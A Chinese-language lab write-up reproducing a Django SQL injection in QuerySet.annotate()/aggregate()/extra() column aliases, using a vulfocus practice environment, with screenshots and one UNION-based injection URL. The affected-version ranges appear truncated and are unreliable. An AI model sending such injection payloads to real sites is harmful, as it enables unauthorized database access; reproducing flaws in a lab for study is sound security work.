## 一， **漏洞概述**

Django 是用 Python 开发的一个免费开源的 Web 框架，几乎囊括了 Web 应用的方方面面，可以用于快速搭建高性能、优雅的网站，Django
提供了许多网站后台开发经常用到的模块，使开发者能够专注于业务部分。

## 二， **漏洞原理**

精心编制的字典，
通过**kwargs传递给QuerySet.annotate()、aggregate()和extra()这些方法，可导致这些方法在列别名中受到SQL注入攻击。

##  **三，影响范围**

  1. 0 <= Django < 4.0.4
  2. 2 <= Django < 3.2.13
  3. 2 <= Django < 2.2.28

##  **四，环境搭建**

这里使用本人本地的vulfocus靶场进行漏洞复现

![1671713638_63a453667d50fe6c54cf6.png!small?1671713639981](https://image.3001.net/images/20221222/1671713638_63a453667d50fe6c54cf6.png!small?1671713639981)

点击启动

![1671713642_63a4536ab93c8cc827bc0.png!small?1671713643919](https://image.3001.net/images/20221222/1671713642_63a4536ab93c8cc827bc0.png!small?1671713643919)

访问IP+端口进行访问环境

![1671713646_63a4536e7f626b6375842.png!small?1671713647644](https://image.3001.net/images/20221222/1671713646_63a4536e7f626b6375842.png!small?1671713647644)

环境搭建成功

## 五， **漏洞复现**

  1. 通过404页面报错页面能够发现传参接口

![1671713651_63a453736edfe671c80d4.png!small?1671713652657](https://image.3001.net/images/20221222/1671713651_63a453736edfe671c80d4.png!small?1671713652657)

  2. 访问报错页面，如果接口存在传参，同样会出现报错

![1671713654_63a453769e72a249b42ac.png!small?1671713655977](https://image.3001.net/images/20221222/1671713654_63a453769e72a249b42ac.png!small?1671713655977)

  3. 使用报错注入的参数进行SQL注入

> /demo?field=demo.name" FROM "demo_user" union SELECT
> "1",sqlite_version(),"3" --
![1671713678_63a4538e67799e002bb7c.png!small?1671713679514](https://image.3001.net/images/20221222/1671713678_63a4538e67799e002bb7c.png!small?1671713679514)

漏洞复现成功。

